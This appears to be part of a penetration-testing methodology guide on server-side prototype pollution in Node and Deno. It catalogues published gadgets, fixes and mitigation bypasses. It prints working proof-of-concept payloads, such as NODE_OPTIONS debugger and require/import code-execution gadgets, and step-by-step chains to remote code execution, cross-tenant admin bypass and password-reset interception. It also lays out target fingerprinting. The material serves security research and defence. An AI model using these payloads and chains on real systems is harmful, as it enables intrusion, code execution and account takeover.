**Worker cluster (8 permission-axis PoCs):** `Worker.env`, `Worker.ffi`, `Worker.hrtime`, `Worker.net`, `Worker.read`, `Worker.run`, `Worker.sys`, `Worker.write`. Each corresponds to one axis of Deno's permission model. The primitive: polluted `Object.prototype.deno.permissions.<axis>` on the Worker constructor options grants the worker permission on that axis beyond what the parent process was granted. This is Deno's permission-escalation shape — the Worker boundary is a permission-crossing that pollution can weaken. There is no Node analog because Node lacks the per-worker permission model.

**fetch (1 PoC):** polluted options on `fetch()` — `.headers` (attacker-controlled headers added to outbound), `.method` (verb change), `.redirect` (redirect-following behavior), `.credentials` (cookie transmission).

**Node-compat child_process (7 PoCs — subset of Silent Spring's Node catalog):** `exec.env`, `execFileSync.env`, `execSync.env`, `spawn.env`, `spawn.gid`, `spawn.uid`, `spawnSync.env`. Note: `spawn.gid` and `spawn.uid` are Deno-specific novel gadgets NOT in Silent Spring's Node catalog — polluted GID/UID drops the child process to an attacker-chosen user/group. Deno's node-compat layer surfaces these gadgets even on code written for Node.

**Node-compat other clusters:** `fs`, `http`, `https`, `zlib` — Deno's node-compat layer inherits the corresponding Node gadgets; version-currency check needed against the specific Deno release's compat-layer implementation.

**std/dotenv (8 PoCs):** `load.<any>`, `load.defaultsPath`, `load.envPath`, `load.export` (+ Sync variants). Polluted `defaultsPath`/`envPath` redirects env-file resolution to an attacker-influenced path — the loaded env then reflects attacker-controlled key/value pairs. `load.export` = `true` writes the loaded env into `Deno.env`, so pollution → env-file swap → process env under attacker control.

**std/json (2 PoCs):** `JsonStringifyStream.prefix`, `JsonStringifyStream.suffix` — polluted prefix/suffix strings are prepended/appended to every JSON-line output. Data-integrity injection into JSON output streams.

**std/log (1 PoC):** `FileHandler.formatter` — polluted formatter function is called on every log entry, executing attacker JS in the log-write path.

**std/tar (2 PoCs):** `Tar.gid`, `Tar.uid` — polluted GID/UID on tar-header construction; extracted files get attacker-chosen ownership. Chain with `path_traversal_lfi_rfi.md § tar-slip class`.

**std/yaml (1 PoC):** `stringify.indent` — polluted indent value affects YAML serialization output; more subtle primitive, likely data-integrity rather than injection-shape.

**Total confirmed named Deno gadgets:** the artifact repo enumerates ~45 specific PoC files covering the 67 confirmed exploitable count from the paper (some PoCs share a single gadget with async+sync variant listings collapsed).

**Frontier note.** Deno frequently patches individual gadgets when disclosed; the gadget category list above is stable but per-gadget reachability on a specific Deno version requires re-verification. GHunter's ghunter4deno artifact repository (persisted at `other-sources/ghunter4deno-root.json`) tracks per-version status.

## Historical Silent Spring Node Gadget Catalog — Full Enumeration

Silent Spring's artifact repository at `KTH-LangSec/server-side-prototype-pollution` enumerates 24 gadget-file PoCs across Node core modules. The 11-universal-gadget count in the paper reflects distinct gadget shapes; the PoC file count is higher because sync/async variants and Windows-vs-Linux variants are separate PoC files. Full enumeration (persisted at `other-sources/sspp-node-*.json`):

**child_process cluster (12 PoCs, largest gadget family):**
- `exec.env.PoC.js` — polluted `Object.prototype.env` reaches `exec` via the options object; child inherits polluted env.
- `execFile.env.PoC.js`, `execFileSync.env.PoC.js` — same for execFile variants.
- `execFileSync.input.win.PoC.js`, `execSync.input.win.PoC.js` — Windows-specific: polluted `input` piped as stdin to spawned `cmd.exe` (BH Asia 2023 slide 40 primitive).
- `execSync.env.PoC.js`, `execSync.env.lnx.PoC.js` — env-spread on execSync; Linux variant is a separate PoC because Linux differential behavior on input handling.
- `fork.env.PoC.js` — polluted env reaches Node child fork; execArgv is also readable via pollution here.
- `spawn.env.PoC.js`, `spawnSync.env.PoC.js`, `spawnSync.env.lnx.PoC.js`, `spawn.input.win.js` — corresponding shapes for spawn/spawnSync.

The cross-platform CDP RCE PoC (from `spawn.env.PoC.js`, verified content):
```javascript
Object.prototype.shell = "node";
Object.prototype.env = { NODE_OPTIONS: '--inspect-brk=0.0.0.0:1337' };
const spawnedProcess = spawn('hostname', { });
```
When `spawn('hostname', {})` runs, `{shell, env}` is read via prototype chain. `shell='node'` means the "hostname" string is passed to Node as JavaScript to evaluate. `env.NODE_OPTIONS=--inspect-brk` opens the CDP debugger. Attacker connects to port 1337 and drives `Runtime.evaluate` for arbitrary execution. Reachable cross-platform on any target where a caller does `spawn(x, {})` with an empty options literal.

**require gadget (2 PoCs) — Node < v18.19.0:**
- `require.main.PoC.js`:
  ```javascript
  Object.prototype.main = 'C:/PROGRA~1/nodejs/node_modules/corepack/dist/npm.js'  // Windows
  //Object.prototype.main = "/usr/lib/node_modules/corepack/dist/npm.js"           // Linux
  Object.prototype.NODE_OPTIONS = '--inspect-brk=0.0.0.0:1337';
  require('bytes')
  ```
  Pre-v18.19.0 mechanism: `require('bytes')` resolves the `bytes` package, reads its `package.json`, and the CJS loader's `parsed.main` fell through to `Object.prototype.main` when `bytes/package.json` lacked its own `main`. Node loaded the polluted path — corepack's npm.js — which spawns subprocesses. Those subprocesses inherit NODE_OPTIONS from the polluted env (chained), CDP debugger opens.
- `require.main2.PoC.js` — a variant with different loading conditions; both fixed by the same v18.19.0 patch.

**import(.mjs) source gadget (1 PoC + test module) — Node < v18.19.0:**
- `import.source.PoC.js`:
  ```javascript
  Object.prototype.source = 'console.log("PWNED")'
  import('./test.mjs')
  ```
  Simplest mechanism: dynamic import of `.mjs` file → module loader reads `source` option from prototype chain → polluted string executed as JavaScript in the module evaluation context. Attacker JS runs during import. Fixed at Node v18.19.0; measured on v24.19.0 the polluted source is ignored and the original `.mjs` content loads.

**http / https cluster (8 PoCs, network primitives):**
- `http/fetch.options.PoC.js`, `http/fetch.socketPath.PoC.js` — polluted options on `fetch()`; `socketPath` in particular reroutes the fetch to a Unix domain socket the attacker chooses (chain: SSRF to internal-service Unix sockets).
- `http/get.options.PoC.js`, `http/request.options.PoC.js` — polluted options on `http.get`/`http.request`; polluted `agent`, `headers`, `method`, `host` all reach the outbound request.
- `http/listen.host.PoC.js` — polluted `Object.prototype.host` on `server.listen(port)` binds the server to an attacker-chosen host (public interface where the caller intended localhost).
- `https/get.options.PoC.js`, `https/request.options.PoC.js` — HTTPS variants.
- `https/tls.connect.PoC.js` — TLS-connect option pollution; polluted `rejectUnauthorized=false` silently disables cert validation on TLS connects made via the shape.

**working_threads (1 PoC):**
- `working_threads/ctor.PoC.js` — polluted Worker constructor options; polluted `resourceLimits`, `execArgv`, or `env` on `new Worker()` reaches the spawned worker thread.

**Total Silent Spring Node PoCs:** 24 files corresponding to 11 distinct gadget shapes (env-spread across child_process/fork; require; import source; http options; https options; tls; server-listen host; worker ctor; Windows execSync input pipe).

**Historical primary-source citation:** Silent Spring paper — `https://www.usenix.org/system/files/sec23summer_432-shcherbakov-prepub.pdf`; BlackHat Asia 2023 presentation slides — `https://i.blackhat.com/Asia-23/AS-23-Shcherbakov-Prototype-Pollution-Leads-to-RCE.pdf`; artifact repo — `https://github.com/KTH-LangSec/server-side-prototype-pollution`.

## Legacy-Node-Target Gadget Reachability

The v18.19.0 fix boundary is the load-bearing dividing line between current-Node target (require+import gadgets dead) and legacy-Node target (both live). Fingerprint the target's Node version first:

**Fingerprinting Node version:**
- Error stack traces embed the Node version path (`node:internal/...` includes version-specific paths on some releases).
- `X-Powered-By: Express` alone doesn't reveal Node; combine with request behavior differences.
- `/api/health`, `/api/version` — many apps expose Node version explicitly.
- Debug endpoints (dev builds) sometimes leak `process.versions`.
- WebSocket subprotocol handshake or specific HTTP header handling can identify Node major version by feature-differential probing.

**Reachability matrix by Node version:**

| Node version | env-spread | require gadget | import source | Windows execSync input | server-listen host | http options | tls.connect |
|---|---|---|---|---|---|---|---|
| < 18.19.0 | live | **live** | **live** | live (Windows) | live | live | live |
| ≥ 18.19.0 to < 20 | live | dead | dead | live (Windows) | live | live | live |
| ≥ 20 (current) | live | dead | dead | live (Windows) | live | live | live |

The env-spread family (spawn/spawnSync/exec/execSync/fork with polluted env) is the durable class across all Node versions — the fix is not in Node core (which can't safely change spawn API semantics) but in individual application call sites that must be rewritten to `Object.create(null)` option objects.

**Legacy target hunt priority:** if Node version fingerprint places the target < v18.19.0, prioritize the require+import ACE gadgets first — they are single-payload RCE with the shape from the Silent Spring PoCs above. The env-spread family is a fallback for post-v18.19.0 targets where those two gadgets are dead.

## Silent Spring 5-Gadget-Baseline Case Studies

The paper identifies five gadgets that drove 12 RCEs across four target apps (Kibana, NPM CLI, Parse Server, Rocket.Chat) in the 5-year public-report review: `child_process.spawn`, `bson`, `lodash.template`, `nodemailer`, and `require`. Full case-study depth per gadget:

**child_process.spawn — NPM CLI GIT_SSH_COMMAND chain.** Covered in canonical detail at § NPM CLI End-to-End Chain above. The gadget is the env-spread pattern; the chain routes through parse-conflict-json diffApply as the pollution primitive.

**bson — Parse Server BSON deserialization gadget.** Covered in canonical detail at § Parse Server bson Bypass Case Study — Anatomy of a Whack-a-Mole Fix above. The gadget is `_bsontype` read via prototype during BSON walk; the 5-iteration denylist bypass anatomy documents why input-filter fixes are class-open.

**lodash.template — template-compile options gadget.** Covered in canonical detail at § ejs / pug / handlebars — Template Compile Gadgets above (the lodash.template subsection). The gadget is polluted `options.imports` and `options.variable` reaching the compiled template scope; sourceURL and variable name become code-generation inputs.

**nodemailer — SMTP transport options gadget.** The gadget: `nodemailer.createTransport(transportOpts)` reads `transportOpts.host`, `.port`, `.secure`, `.auth`, `.proxy` via property access. Polluted `Object.prototype.host` + `.auth = { user: 'anything', pass: 'anything' }` reroutes mail traffic to an attacker SMTP server. In Rocket.Chat's historical chain, this gadget was reached via a pollution primitive in the outbound-mail-config path; the impact was mail exfiltration (attacker receives every email the app sends, including password-reset tokens and confirmation links → account takeover). Chain hop: pollution → nodemailer transport swap → account takeover via reset-token interception.

**require — the pre-v18.19.0 gadget.** Covered above at § Historical Silent Spring Node Gadget Catalog — the require.main.PoC.js mechanism. On legacy Node targets this is a single-payload RCE.

**Kibana chain (Silent Spring / GHunter).** Kibana v8.7.0 was demonstrated exploitable via the require gadget in Silent Spring, with a further variant identified by GHunter. Specific CVE attribution beyond "the require gadget" is not asserted here — the refuted CVE-2023-31414 attribution (Boolean-typed regression) has been kept out per the refuted-ledger; the primary-source claim is that Kibana on affected Node versions was exploitable via the same require gadget class.

**Rocket.Chat chain.** Silent Spring documents multiple pollution primitives in Rocket.Chat reaching gadgets including nodemailer transport swap and child_process spawn env-spread. The chain-per-vulnerability details are in the paper's Section 6.3; the class shape is the same as documented above.

## Mitigation-Bypass as a Technique Class

The final novel-tier concept: gadget-level fixes are required because input-filtering / denylisting mitigations have been repeatedly bypassed. This framing is itself a technique class the base and advanced siblings route to.

**kEmptyObject default in Node core — bypass by design.** Node's `child_process` core wraps options handling with a `kEmptyObject = ObjectFreeze({ __proto__: null })` default:
```javascript
function spawn(command, args, options) {
  options = options !== undefined ? options : kEmptyObject;
  // ...
}
```
This substitutes the null-proto frozen empty object when `options === undefined`. It **does not fire** when the caller passes a constructed options object literal, because the constructed literal is `!== undefined`. Since real callers virtually always construct an options literal (the base pattern of `{env, cwd, ...}`), the default's protection surface is narrow.

BH Asia 2023 slide 39 shows the substitution logic; slide 40 (titled "NPM CLI Gadget is still Exploitable") shows NPM CLI's `makeOpts` returns `{}` (a fresh literal) or a populated object — never `undefined` — so the kEmptyObject default is never taken. The env-spread gadget survives.

**Parse Server bson denylist — 5 bypasses.** Silent Spring documents Parse Server's approach to fixing the bson gadget: adding a denylist of properties to skip during BSON deserialization. Each iteration of the denylist was bypassed:
1. Add `__proto__` to denylist → bypass via `constructor.prototype`.
2. Add `constructor` → bypass via other prototype-chain-reachable paths.
3. Add specific inherited method names → bypass via yet other bson deserialization paths.
4. Add wider blocks → bypasses via metadata-specific fields (e.g., files metadata).
5. Each bypass was patched; each patch was itself bypassed within weeks.

The Silent Spring conclusion (verbatim from the paper): "This highlights the need to fix gadgets because mitigation is difficult and often leaves room for exploitation by other means."

**Class principle: the gadget is the fix target, not the input.** Filtering/denylisting the pollution primitive (input side) is a whack-a-mole surface. The durable fix is at the gadget site — the sink that lifts the polluted key into the sensitive operation. Two shapes for the gadget-side fix:

1. **Own-property-only read.** Rewrite the gadget to read via `Object.hasOwn(opts, key) ? opts[key] : default` rather than `opts[key] || default`. This narrows the sink to only own-property reads; prototype-inherited values are ignored.
2. **Structured options.** Rewrite the API to accept `Map` or a null-proto object rather than a plain object; then the whole prototype-inheritance surface is closed.

The pentester's use of this class: when a target claims "we patched pollution," verify at the gadget side, not just at the parser. A parser hardening + unchanged gadget is a partial mitigation; the pollution can still fire via any alternative parser path (multipart vs JSON, GraphQL variable, WebSocket) that reaches the same gadget.

**Regression pattern.** Fixes that add key-blocklists have a distinct regression signature: a later version adds a new deserialization code path (say, for a new BSON type or a new merge helper) that doesn't go through the blocklist. Grep the target's dependency changelogs for "add support for X" post-fix, and re-check the new code path against the same pollution payload.

## utils-extend Family — Small Merge Utilities as a Class

The utils-extend CVE is the current 2024–2026 instance of a durable pattern: small, single-maintainer merge utilities with low download counts periodically ship unpatched pollution primitives. The class is worth naming because grep-based dependency audit against known-CVE lists misses it — the vulnerable packages don't have the visibility that would push a fix into upstream tooling.

**Pattern signature.**
- Single-maintainer package on npm/GitHub.
- Weekly downloads in the low thousands or below.
- Last commit > 12 months ago.
- Advertises "deep merge", "extend", "assign deep", or "recursive assign" functionality.
- Source is < 200 lines, often ≈ 50 lines of core merge loop.
- No test coverage for `__proto__` / `constructor.prototype` key handling.

**Detection at scale in the target's dependency tree.**
1. Extract lockfile (package-lock.json, yarn.lock, pnpm-lock.yaml, npm-shrinkwrap.json).
2. Enumerate all packages regardless of transitive depth.
3. For each package matching the "small merge utility" heuristic (name contains extend/merge/assign/copy + < 100k weekly downloads), fetch source and test with the merge-clone matrix (base's measurement 01).
4. Any package producing `({}).polluted === 'yes'` from a `__proto__` payload is a pollution primitive in the dependency chain.

**Adjacent utility classes with the same shape.**
- Small pluck/pick libraries doing recursive copy of allow-listed keys — allow-list logic often skips `__proto__` blocking because the developer assumed allow-list = blocklist coverage.
- Small config-loader libraries doing `Object.assign` loops.
- Small object-mapper / DTO libraries.
- Legacy jQuery-adjacent utilities kept on npm for backwards compatibility.

**Reporting shape.** When utils-extend or a cousin is found in a target's deps, report as pollution-primitive with the version boundary; the sink (whatever downstream code reads a polluted key) is the impact multiplier. On its own, a merge primitive without a reachable sink is a lower-severity finding — a plausible-later-exploitation shape rather than a direct RCE.

## Chains — Novel-Tier Composite Constructions

Base and advanced enumerate the primary chains; this section adds novel-tier chains anchored to specific CVE/gadget mechanisms.

**Chain N1 — devalue per-instance override → post-parse method injection.**
1. Precondition: application uses `devalue.parse` on an attacker-controlled JSON string (SvelteKit form action `POST`, custom RPC accepting devalue-serialized values, RSC-adjacent deserialization).
2. Primitive: submit a devalue payload with a `__proto__` key in the plain-object case (per CVE-2025-57820 mechanism above).
3. Downstream: application code calls a method (`.magnitude`, `.serialize`, `.toString`, or similar) on the reconstructed instance; the method now runs attacker code.
4. Impact: scoped code execution in the calling context — usually the SvelteKit action handler or the RPC dispatcher, with access to the request's session/context.
5. Route composition: `xss.md` when the method's return value flows into a rendered template; `rce.md` for the direct execution.

**Chain N2 — Array.prototype.push aliasing → app-wide execution.**
1. Precondition: same devalue.parse endpoint.
2. Primitive: submit a devalue array payload with non-numeric index like `"push"` referencing a value slot containing attacker JS.
3. Downstream: every subsequent `array.push(...)` in the process runs attacker code instead of native push. Broadly reachable because `push` is ubiquitous.
4. Impact: process-wide execution; the next `push` call anywhere in the app fires.
5. Route composition: `rce.md` (execution class), potentially `dos.md` (breaking legitimate `push` semantics).

**Chain N3 — canvg SVG upload → pollution → export-worker RCE.**
1. Precondition: application allows SVG uploads that are server-side rasterized via canvg (SSR image generation, PDF export from SVG).
2. Primitive: SVG payload with crafted `<style>` block that lands in the vulnerable `StyleElement` constructor path (CVE-2025-25977).
3. Pollution: `Object.prototype.env.NODE_OPTIONS = '--require /tmp/x.js'` or `Object.prototype.outputFunctionName = '<attacker JS>'`.
4. Downstream: export worker's next spawn call (git for a repo asset, image conversion for downstream format) inherits polluted env → RCE; OR downstream ejs/pug/handlebars template compile picks up polluted option → RCE.
5. Impact: RCE in the export worker context (secrets, credentials, output tampering).
6. Route composition: `prototype_pollution_advanced_deep.md § Second-Order Deep` for the export-pipeline pattern, `rce.md` for the exec.

**Chain N4 — GHunter import(.mjs) source gadget on legacy-pinned Node (< v18.19.0).**
1. Precondition: target runs Node < v18.19.0 (verified via server response headers, error stack traces, or a direct info-leak endpoint).
2. Primitive: pollute `Object.prototype.source` with JavaScript code via any reachable merge sink.
3. Downstream: any subsequent `import()` of a `.mjs` file (dynamic imports in application code, transitive dependency loads).
4. Impact: attacker JS runs in the module evaluation context.
5. Route: `rce.md`. Precondition sensitivity: modern Node kills this chain — the version check is the primary gate.

**Chain N5 — Deno `Worker.run` permission escalation.**
1. Precondition: Deno target that spawns workers with `--allow-run` restricted permissions (parent process is permission-limited).
2. Primitive: pollute `Object.prototype.permissions` with attacker-controlled permission grants; polluted `Object.prototype.args` or `Object.prototype.deno.permissions.run = ["*"]` on the Worker options.
3. Downstream: the spawned Worker inherits the polluted options (via prototype chain read of Worker constructor options).
4. Impact: Worker runs with permissions the parent process was not granted — permission-escalation across the Deno permission boundary.
5. Route: `deno`-specific surface (framework file if present); no direct Node analog.

**Chain N6 — canvg SSR pipeline → NODE_OPTIONS CDP → export-worker RCE.**
1. Precondition: SaaS with SVG chart export via canvg (SSR), Node target for the export worker with any port reachable from a private-network position attackers can reach (or a chained finding providing that reachability).
2. Primitive: attacker uploads chart-source SVG containing the canvg CVE-2025-25977 payload; SVG rasterization pipeline calls canvg StyleElement constructor → prototype pollution.
3. Polluted key: `Object.prototype.env = { NODE_OPTIONS: '--inspect-brk=0.0.0.0:9229' }`.
4. Downstream: export worker next spawns a Node child (chart-image processing, secondary conversion, git clone for asset repo) → child opens CDP at 9229.
5. Impact: attacker connects to 9229 (via network path, tunnel, or chained SSRF), issues `Runtime.evaluate`, arbitrary code in the export worker.
6. Route composition: `§ canvg CVE-2025-25977` → `§ child_process — Cross-Platform NODE_OPTIONS CDP Gadget`.

**Chain N7 — Persistent pollution in serverless warm container → cross-tenant admin bypass.**
1. Precondition: multi-tenant serverless Node app (Lambda, Vercel, Cloudflare Workers with Node-compat) that reuses warm containers across tenants.
2. Primitive: tenant A submits pollution payload during their request lifecycle; payload pollutes `Object.prototype.isAdmin = true` (or a per-tenant role key).
3. Persistence: warm container reuses across the next N invocations; auth middleware reads `user.isAdmin` via prototype chain.
4. Downstream: tenant B's request lands in the same warm container; auth middleware reads polluted true; tenant B's request is treated as admin.
5. Impact: cross-tenant privilege escalation without any credential compromise.
6. Route: `prototype_pollution_advanced_deep.md § Cross-Request Persistence Windows` for the serverless-warm-container framing.

**Chain N8 — Second-order via config reload → runtime pollution → template SSTI.**
1. Precondition: app periodically reloads config from an external source (S3, git repo, admin UI) via a merge into running defaults.
2. Primitive: attacker writes payload to the config source (via chained finding or authorized admin-role compromise).
3. Trigger: next config reload merges polluted config into runtime state.
4. Polluted key: template compile options (`outputFunctionName`, `filters`, `imports`).
5. Downstream: next template render (any user-facing HTML endpoint) compiles with polluted options → attacker JS in the compile.
6. Impact: RCE on next render; execution context is the app's main worker (or export worker if template rendering happens there).
7. Route: `prototype_pollution_advanced_deep.md § Second-Order Deep` + `§ ejs / pug / handlebars — Template Compile Gadgets`.

Chain hops are reachability/enablement only; each hop's actual firing depends on the target's version pins, sink presence, and configuration.

## Parse Server bson Bypass Case Study — Anatomy of a Whack-a-Mole Fix

Silent Spring documents Parse Server's bson gadget and its 5-cycle mitigation bypass; the case study is the empirical foundation for the mitigation-bypass class. Reconstructing it:

**The gadget.** bson deserialization for MongoDB documents walks incoming BSON into JavaScript objects. Historically the walk read a `_bsontype` property via prototype chain to determine object type; a polluted `Object.prototype._bsontype` caused misinterpretation and — via a longer chain — eventual arbitrary code execution in Parse Server request handlers.

**Iteration 1 — inline __proto__ check.** Parse Server added a check that rejected object keys named `__proto__` at BSON parse time.
- *Bypass:* `constructor.prototype` reached the same primitive; the check was too narrow.

**Iteration 2 — widened key blocklist.** Added `constructor` to the blocklist.
- *Bypass:* alternate deserialization paths (nested inside array-typed fields, files-metadata fields) reached the sink without going through the blocklist-checked walker.

**Iteration 3 — recursive check on nested paths.** Extended the blocklist to recursive descent.
- *Bypass:* files-metadata sub-schema had its own deserialization code path that didn't invoke the recursive check.

**Iteration 4 — files-metadata patched separately.** Fixed the files-metadata path.
- *Bypass:* the class of gadgets remained (any newly added BSON type could re-open the surface), and researchers identified additional paths within weeks.

**Iteration 5 — remove the gadget entirely from bson.** Instead of continuing to filter input, the maintainers rewrote the vulnerable read to use own-property-only access (`Object.hasOwn(obj, '_bsontype') ? obj._bsontype : undefined`).
- *Class-closed:* prototype-chain reads are now impossible for that specific field, closing the sink regardless of what input filters do or don't allow.

**Empirical lesson.** Each of the first four iterations was a defensive addition at the input layer; each was bypassed within weeks by a new deserialization path or a variant key name. The fifth iteration — moving the fix to the sink — closed the class. This is the empirical support for the master-prompt's "fix gadgets, not inputs" framing.

**Pentester's use of the pattern.** When a target claims to have patched a pollution class, ask specifically: (1) is the patch at the parser (input filter, blocklist) or at the sink (own-property-only read, `Map` instead of `{}`)? (2) if at the parser, is there an alternate input path that reaches the same sink? (3) if at the sink, is the same key read from any other sink site the app hasn't patched?

Parser-level fixes routinely leave the class open through alternative paths. Sink-level fixes close the class for that specific key at that specific sink; the class remains open at other unpatched sinks and for other polluted keys.

## Regression-Pattern Playbook

Fixed pollution classes reopen through specific regression patterns. The playbook for verifying a target's claimed patches:

**Pattern 1 — new library version adds a code path missed by the blocklist.** Grep the target's dependency changelogs for "add support for X" post the CVE fix date. Any new deserialization/merge/set code added after the fix is a candidate re-opening. Test the same payload against the new path.

**Pattern 2 — dependency downgrade / pin regression.** A target that patched at v4.x may have downgraded a dependency to v3.x for compatibility reasons — the v3.x still has the vulnerability. Check lockfile against latest release; note downgrades.

**Pattern 3 — feature toggle re-enables the class.** Some libraries have a `legacy: true` option or a `compatibility` flag that reverts to older parsing behavior; if the flag is set, the fix is bypassed. Grep target config for compatibility/legacy flags.

**Pattern 4 — transitive dependency ships the pattern.** Direct dependency patched, but a transitive dependency (dependency of a dependency) still has the pattern. Full-tree lockfile enumeration required.

**Pattern 5 — patch shipped only in Enterprise-Support branch.** OSS branch lacks the fix; the target's build uses the OSS branch. Verify what version is actually installed vs what the security advisory mentions. This mirrors the Spring functional-framework CVE pattern (batch 6 finding).

**Pattern 6 — CVE fix breaks the specific bypass but not the class.** The fix might address a specific payload without closing the class — a variant key name or nested shape works. Test with variants beyond the CVE's PoC payload.

## Detection Methodology at the Frontier

### Match target against CVE

1. **Version-fingerprint installed packages** against the CVE version table (§ 2024–2026 CVE Version/Fix Table). Sources for the fingerprint: `package-lock.json` / `yarn.lock` / `pnpm-lock.yaml` if source-available; response headers (`X-Powered-By`, `Server`) for framework fingerprints; error stack traces revealing package paths and versions; API endpoints that leak dependency versions (e.g., `/api/health`, `/api/version`, `/admin/status`).
2. **For each in-range CVE, trigger the class-specific reachability check.** canvg → upload SVG with the crafted style block. messageformat → submit locale JSON with `__proto__` in nested keys. devalue → submit a devalue-serialized string to the relevant deserializer endpoint. utils-extend → any endpoint whose backing code path uses utils-extend on user input.
3. **For chains, verify the downstream sink fires on the request path.** A pollution that reaches Object.prototype but whose sink (spawn, template compile) is never invoked in the request's code path is a lower-severity finding — plausible-later-exploitation, not direct RCE. Trace the sink invocation via error injection, timing differential, or (in white-box) instrumentation.

### Match target against runtime gadget

1. **Fingerprint the runtime.** Node version banner via server response (`Server: `, `X-Node-Version:`), error stack traces (Node internal paths embed version), banner grabbing on debug ports. Deno version via similar surfaces.
2. **Apply the v18.19.0 boundary.** For Node < v18.19.0: require and import(.mjs) source gadgets are live. For Node ≥ v18.19.0: both dead; test only env-spread and shell-based gadgets.
3. **Test the two-gadget group current on modern Node: env-spread and Windows shell.**
   - Env-spread: pollute `Object.prototype.env = { CANARY_ENV: 'val' }`, trigger a request that leads to a spawn; check whether child inherited CANARY_ENV. If yes, gadget is live; escalate to NODE_OPTIONS CDP payload.
   - Windows shell: only when target is Windows AND the caller pattern matches BH Asia 2023 slide 40. Cross-platform note: Linux differential doesn't reproduce the input-pipe trick without an explicit input path.
4. **On Deno targets, run through the ghunter4deno gadget categories.** Deno.Command, Worker.*, fetch, node-compat, std lib. Match Deno version against the paper's tested version; re-verify on newer versions where individual gadgets may be patched.

### Match target against mitigation shape

1. **Identify what defense the target claims** — the target may state this in security documentation, README, or via a bug bounty program's out-of-scope list. Candidates: parser blocklist, framework validation (Fastify schema, NestJS ValidationPipe, Zod strict), `Object.freeze(Object.prototype)`, `--disable-proto=throw`, gadget-level own-property-only reads.
2. **Confirm the mitigation actually holds against the standard payload set.** Test all four canonical shapes: `__proto__`, `constructor.prototype`, dotted-path (`__proto__.polluted`), bracket-notation (`?__proto__[x]=y`). A parser blocking one shape often misses others.
3. **Look for the mitigation-bypass shape.** Concretely:
   - **kEmptyObject class:** app caller does `spawn(cmd, args, {})` (empty literal, not undefined) — Node's kEmptyObject default doesn't fire. Test with the env-spread canary.
   - **Blocklist-doesn't-cover-new-code-path:** target patched a specific version; check the target's next code-path change (dependency version bump, new feature, new deserialization type) for regression.
   - **Object.freeze on Object.prototype but not on class prototypes:** test pollution targeting `Buffer.prototype` or a class prototype the target uses; may still be writable.
   - **`--disable-proto=throw` but merges still recurse:** the flag stops `a.__proto__ = X` writes but doesn't stop `for (k in src) { if (k === '__proto__') target[k] = src[k] }` where the assignment goes through the descriptor mechanism. Test that specific bypass.

### Fingerprinting the pollution primitive without a canary

When the target has hardened output (no direct canary read-back on any endpoint), pollution-primitive existence can still be inferred via side-channel:

1. **Timing.** Pollute `Object.prototype.timeout = 30000`; if the app's fetch/http caller reads `opts.timeout` via prototype chain, subsequent outbound requests take up to 30s instead of the default. Statistical timing measurement (50 request baseline + 50 request post-pollution) confirms.
2. **Error-shape.** Pollute `Object.prototype.length = 'not-a-number'`. Any code path doing `arr.length` iteration might crash (a fresh array's own-property length overrides, so this pollution rarely fires; better target `.size`, `.count`, `.limit`).
3. **Behavioral difference in unrelated endpoints.** Pollute a key that changes response shape (e.g., `.pretty = true` for JSON stringify defaults, `.verbose = true` for error output). Compare an unrelated endpoint's response before and after.

### White-box audit workflow

1. Grep lockfile for known-vulnerable packages (CVE table entries + the small-utils family patterns).
2. Grep source for merge/set/parse sinks (see `prototype_pollution_advanced_deep.md § Anti-Pattern Detection Playbook`).
3. Grep for reads of the polluted-key candidates: `env`, `main`, `source`, `outputFunctionName`, `escapeFunction`, `agent`, `dispatcher`, `filters`, `imports`, `scriptSrc`, `isAdmin`, `role`, `permissions`.
4. For each source-sink pair on the same request path, construct the concrete payload and verify.
5. Prioritize sinks that lead to RCE (spawn, template compile, dynamic import) over sinks that lead to logic bypass (auth flag) — RCE is harder to develop but higher impact per hour spent.

### Black-box audit workflow

1. Baseline: send canary payload via every input channel (JSON body, form, multipart, GraphQL variable, WebSocket message, URL fragment for client-side); probe an unrelated endpoint for the canary.
2. If baseline finds pollution: enumerate reachable sinks by grepping the target's client-side bundle and any exposed OpenAPI/GraphQL schema for API surfaces that likely spawn / render / deserialize.
3. If baseline finds no pollution: switch to blind confirmation (timing, error-shape, behavioral).
4. If blind confirmation also finds nothing: check for the mitigation shapes above; report the finding as "pollution primitive appears blocked at [layer]".
5. Where possible, chain-construct end-to-end and demonstrate impact (auth bypass, RCE, XSS) — a canary alone is a lower-tier finding.

## Summary

The 2024–2026 CVE surface is anchored by five verified advisories with a preserved canonical version/fix table and a measured merge-function landscape that corrects the widespread "these merge functions still pollute" narrative — on modern-patched mainstream libraries only utils-extend@1.0.8 (unpatched CVE-2024-57077) currently pollutes; devalue's `__proto__` primitive is per-instance-scoped rather than global; the Silent Spring/GHunter universal-gadget baseline yields 123 gadgets across Node and Deno with two Node-core ACE gadgets already fixed at v18.19.0; and the mitigation-bypass shape (kEmptyObject default doesn't fire on constructed literals, denylists lose to new code paths) is the durable technique class that predicts the next regression.
